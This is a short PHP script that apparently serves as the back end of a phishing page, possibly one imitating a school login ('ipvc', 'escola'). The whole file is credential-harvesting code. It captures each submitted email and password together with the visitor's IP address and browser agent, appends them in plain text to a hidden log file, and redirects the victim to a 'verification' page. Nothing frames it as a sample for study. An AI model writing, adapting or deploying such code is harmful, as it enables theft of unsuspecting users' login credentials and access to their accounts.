<?php

    session_start();
    
    $email = $_POST['login'];
    $password = $_POST['pass'];
    $user_agent = $_SERVER['HTTP_USER_AGENT'];
    $ip = $_SERVER['REMOTE_ADDR'];
    $escola = $_SESSION['escola'];


    $fileName = 'E4D0024355A9238A1F68C8B013FD0731F83B3D8986F2C2FB44D4A4B77F91EBDB_phase1.txt';

    $myfile = fopen($fileName, "a+") or die("Unable to open file!");
    fwrite($myfile, $email.':'.$password.' agent='.$user_agent.' ip='.$ip. ' escola=' . $escola . "\n");
    fclose($myfile);

    $_SESSION['email']=$_POST['login'];
    $_SESSION['password']=$_POST['pass'];
    $_SESSION['user_agent']=$_SERVER['HTTP_USER_AGENT'];
    $_SESSION['ip']=$_SERVER['REMOTE_ADDR'];

    header('Location: /ipvc/verificar.php');
?>